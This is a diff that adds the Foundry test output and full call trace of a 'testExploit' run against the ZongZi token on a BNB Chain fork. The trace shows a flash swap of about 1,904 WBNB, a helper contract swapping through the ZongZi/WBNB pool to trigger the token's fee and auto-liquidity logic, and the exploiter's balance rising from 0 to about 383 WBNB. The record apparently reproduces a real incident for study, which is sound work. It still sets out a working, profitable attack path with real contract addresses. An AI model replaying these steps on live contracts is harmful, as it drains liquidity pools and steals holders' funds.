@@ -1,0 +1,682 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/ZongZi_exp.sol:ContractTest
+[PASS] testExploit() (gas: 2687359)
+Logs:
+  Exploiter WBNB balance before attack: 0.000000000000000000
+  Exploiter WBNB balance after attack: 383.438938729511271045
+
+Traces:
+  [7111] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f)
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], "ZongZi")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(BUSDT_WBNB: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], "BUSDT_WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], "WBNB_ZONGZI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [3029559] ContractTest::testExploit()
+    ├─ [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "Exploiter WBNB balance before attack", val: 0, decimals: 18)
+    ├─ [2534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   └─ ← [Return] 1500000000000000000000 [1.5e21]
+    ├─ [0] VM::load(0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9, 0x0000000000000000000000000000000000000000000000000000000000000009) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000092
+    ├─ [3002716] BUSDT_WBNB::swap(0, 1904347826086956521739 [1.904e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ [27962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1904347826086956521739 [1.904e21])
+    │   │   ├─ emit Transfer(from: BUSDT_WBNB: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1904347826086956521739 [1.904e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000673c229228ac68590b
+    │   │   │   @ 0x65a91b743eebb93754974b0d76ae6fbcc9c7843adbbd90f71368692e5c22fe4d: 0x000000000000000000000000000000000000000000000491d8804d45edcbc0f5 → 0x00000000000000000000000000000000000000000000042a9c5dbb1d416367ea
+    │   │   └─ ← [Return] true
+    │   ├─ [2933309] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 1904347826086956521739 [1.904e21], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   │   ├─ [817049] → new Helper@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   │   │   └─ ← [Return] 4081 bytes of code
+    │   │   ├─ [25162] WBNB::transfer(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1904347826086956521739 [1.904e21])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1904347826086956521739 [1.904e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000673c229228ac68590b → 0
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x0000000000000000000000000000000000000000000000673c229228ac68590b
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1772945] Helper::exploit()
+    │   │   │   ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x6c07e79148452d63a92847675cfe62442cc4fcbb6b98ceb991e587f7e050fc0d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [24769] ZongZi::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1904347826086956521739 [1.904e21]
+    │   │   │   ├─ [120395] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000000000000 [1e17], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1711441545 [1.711e9])
+    │   │   │   │   ├─ [6225] WBNB::transferFrom(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 100000000000000000 [1e17])
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 100000000000000000 [1e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x00000000000000000000000000000000000000000000005150ae84a8cdf00000 → 0x0000000000000000000000000000000000000000000000515211ca212b7a0000
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000673c229228ac68590b → 0x0000000000000000000000000000000000000000000000673abf4cb04ede590b
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2656] ZongZi::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1500000000000000000000 [1.5e21], 3750000000000000000000000000000000 [3.75e33], 1711355145 [1.711e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1500100000000000000000 [1.5e21]
+    │   │   │   │   ├─ [97789] WBNB_ZONGZI::swap(0, 249358417665225262520042417179 [2.493e29], Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [73763] ZongZi::transfer(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 249358417665225262520042417179 [2.493e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], value: 24935840877722526252004241717 [2.493e28])
+    │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 224422567899502736268038175462 [2.244e29])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000002d525ff47922193202eaafae6
+    │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0 → 0x0000000000000000000000000000000000000000509271b29e758220052f7135
+    │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000b8e3a78112e814d5156580000000 → 0x000000000000000000000000000000000000b8e081c8a1ede43e00254c2593e5
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1500100000000000000000 [1.5e21]
+    │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3749750641591222774737479957582821 [3.749e33]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 1500100000000000000000 [1.5e21], reserve1: 3749750641591222774737479957582821 [3.749e33])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 100000000000000000 [1e17], amount1In: 8888000000000000000000 [8.888e21], amount0Out: 0, amount1Out: 249358417665225262520042417179 [2.493e29], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x66013509b8e3a78112e814d515658000000000000000005150ae84a8cdf00000 → 0x66013509b8e081c8a1ede43e00254c2593e50000000000515211ca212b7a0000
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 224422567899502736268038175462 [2.244e29]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [656] ZongZi::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 224422567899502736268038175462 [2.244e29]
+    │   │   │   ├─ [439191] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(224422567899502736268038175462 [2.244e29], 0, [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1711441545 [1.711e9])
+    │   │   │   │   ├─ [410902] ZongZi::transferFrom(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 224422567899502736268038175462 [2.244e29])
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], value: 22442255901150273626803817546 [2.244e28])
+    │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3749750641591222774737479957582821 [3.749e33]
+    │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: 0x000000000000000000000000000000000000dEaD, value: 28123129811934170810531099681871 [2.812e31])
+    │   │   │   │   │   ├─ [9102] WBNB_ZONGZI::sync()
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1500100000000000000000 [1.5e21]
+    │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3721627511779288603926948857900950 [3.721e33]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 1500100000000000000000 [1.5e21], reserve1: 3721627511779288603926948857900950 [3.721e33])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 8: 0x66013509b8e081c8a1ede43e00254c2593e50000000000515211ca212b7a0000 → 0x66013509b77d8b0ce34658ee2cf1d155ef960000000000515211ca212b7a0000
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit AutoNukeLP()
+    │   │   │   │   │   ├─ [275] Router::WETH() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 40271382262041879896986850373 [4.027e28])
+    │   │   │   │   │   ├─ [74884] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(40271382262041879896986850373 [4.027e28], 0, [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], 1711355145 [1.711e9])
+    │   │   │   │   │   │   ├─ [8956] ZongZi::transferFrom(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 40271382262041879896986850373 [4.027e28])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 40271382262041879896986850373 [4.027e28])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x000000000000000000000000000000000000000099163e3ccb4b591a1443bd7f → 0x000000000000000000000000000000000000000016f68955eb4b4d5d830a293a
+    │   │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x0000000000000000000000000000000000000000821fb4e6e0000bbc91399445 → 0
+    │   │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000b77d8b0ce34658ee2cf1d155ef96 → 0x000000000000000000000000000000000000b77e0d2c982d38ee38ae628f83db
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1500100000000000000000 [1.5e21], 3721627511779288603926948857900950 [3.721e33], 1711355145 [1.711e9]
+    │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3721667783161550645806845844751323 [3.721e33]
+    │   │   │   │   │   │   ├─ [40380] WBNB_ZONGZI::swap(16191685534844773 [1.619e16], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   │   │   │   ├─ [25162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 16191685534844773 [1.619e16])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 16191685534844773 [1.619e16])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x00000000000000000000000000000000000000000000000000398640909e8765
+    │   │   │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x0000000000000000000000000000000000000000000000515211ca212b7a0000 → 0x00000000000000000000000000000000000000000000005151d843e09adb789b
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1500083808314465155227 [1.5e21]
+    │   │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3721667783161550645806845844751323 [3.721e33]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 1500083808314465155227 [1.5e21], reserve1: 3721667783161550645806845844751323 [3.721e33])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 40271382262041879896986850373 [4.027e28], amount0Out: 16191685534844773 [1.619e16], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 8: 0x66013509b77d8b0ce34658ee2cf1d155ef960000000000515211ca212b7a0000 → 0x66013509b77e0d2c982d38ee38ae628f83db00000000005151d843e09adb789b
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 16191685534844773 [1.619e16]
+    │   │   │   │   │   │   ├─ [9223] WBNB::withdraw(16191685534844773 [1.619e16])
+    │   │   │   │   │   │   │   ├─ [83] Router::fallback{value: 16191685534844773}()
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 16191685534844773 [1.619e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x00000000000000000000000000000000000000000000000000398640909e8765 → 0
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [55] ZongZi::fallback{value: 16191685534844773}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [2769] ZongZi::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 7106714516830919981821208889 [7.106e27])
+    │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 7106714516830919981821208889 [7.106e27])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0 → 0x000000000000000000000000000000000000000016f68955eb4b4d5d830a2939
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [125113] Router::addLiquidityETH{value: 2857356270854959}(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], 7106714516830919981821208889 [7.106e27], 0, 0, 0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266, 1711355145 [1.711e9])
+    │   │   │   │   │   │   ├─ [2676] Recovery::getPair(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d695c08a4c3b9fc646457ad6b0dc0a3b8f1219fe
+    │   │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1500083808314465155227 [1.5e21], 3721667783161550645806845844751323 [3.721e33], 1711355145 [1.711e9]
+    │   │   │   │   │   │   ├─ [6956] ZongZi::transferFrom(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 7089024439377376011384794017 [7.089e27])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 7089024439377376011384794017 [7.089e27])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 17690077453543970436414872 [1.769e25])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x000000000000000000000000000000000000000016f68955eb4b4d5d830a2939 → 0x0000000000000000000000000000000000000000000ea20505343ef9a535fd98
+    │   │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000b77e0d2c982d38ee38ae628f83db → 0x000000000000000000000000000000000000b77e24147f7e1f0547124063af7c
+    │   │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x000000000000000000000000000000000000000016f68955eb4b4d5d830a293a → 0x0000000000000000000000000000000000000000000ea20505343ef9a535fd99
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [21974] WBNB::deposit{value: 2857356270854959}()
+    │   │   │   │   │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2857356270854959 [2.857e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000000000a26c01985632f
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [3262] WBNB::transfer(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 2857356270854959 [2.857e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 2857356270854959 [2.857e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x00000000000000000000000000000000000000000000005151d843e09adb789b → 0x00000000000000000000000000000000000000000000005151e26aa0b460dbca
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000000000a26c01985632f → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [73418] WBNB_ZONGZI::mint(0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266)
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1500086665670736010186 [1.5e21]
+    │   │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3721674872185990023182857229545340 [3.721e33]
+    │   │   │   │   │   │   │   ├─ [2354] Recovery::feeTo() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000ed943ce24baebf257488771759f9bf482c39706
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266, value: 4517624541567856028642 [4.517e21])
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 1500086665670736010186 [1.5e21], reserve1: 3721674872185990023182857229545340 [3.721e33])
+    │   │   │   │   │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 2857356270854959 [2.857e15], amount1: 7089024439377376011384794017 [7.089e27])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 11: 0x0000000000000000003aba4d2eba779214affcd2e01d8a8256a8000000000000 → 0x0000000000000000003a499a9db018686da31651f519b8d62683f3c114478bd8
+    │   │   │   │   │   │   │   │   @ 8: 0x66013509b77e0d2c982d38ee38ae628f83db00000000005151d843e09adb789b → 0x66013509b77e24147f7e1f0547124063af7c00000000005151e26aa0b460dbca
+    │   │   │   │   │   │   │   │   @ 0x8ff53ce6baf2922ba519d18a95cc0cd8efa766a893cf420a213b256f9e2dad5d: 0 → 0x0000000000000000000000000000000000000000000000f4e6a28127c2fa2be2
+    │   │   │   │   │   │   │   │   @ 0: 0x000000000000000000000000000000000000000007a9d4c197e8151a37a96b30 → 0x000000000000000000000000000000000000000007a9d5b67e8a9641faa39712
+    │   │   │   │   │   │   │   └─ ← [Return] 4517624541567856028642 [4.517e21]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000016e7e750e6170e63ddd42ba1000000000000000000000000000000000000000000000000000a26c01985632f0000000000000000000000000000000000000000000000f4e6a28127c2fa2be2
+    │   │   │   │   │   ├─ [0] 0xe516c9C7924Efa19532Bf0e95eCD2647C5a16399::fallback{value: 5714712541709919}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [55] 0xDe0cB15C6aa16D220549430B0ab90Beb3694D10b::fallback{value: 1904904180569973}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [77202] 0xDe0cB15C6aa16D220549430B0ab90Beb3694D10b::addReward(1904904180569973 [1.904e15])
+    │   │   │   │   │   │   ├─ emit RewardAdded(reward: 1904904180569973 [1.904e15])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 7: 0 → 0x00000000000000000000000000000000000000000000000000000000660e6409
+    │   │   │   │   │   │   │   @ 8: 0 → 0x000000000000000000000000000000000000000000000000000000008369d180
+    │   │   │   │   │   │   │   @ 9: 0 → 0x0000000000000000000000000000000000000000000000000000000066013509
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 201980303110352462641234357916 [2.019e29])
+    │   │   │   │   │   ├─ emit Approval(owner: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665416141471558081271645091464473 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
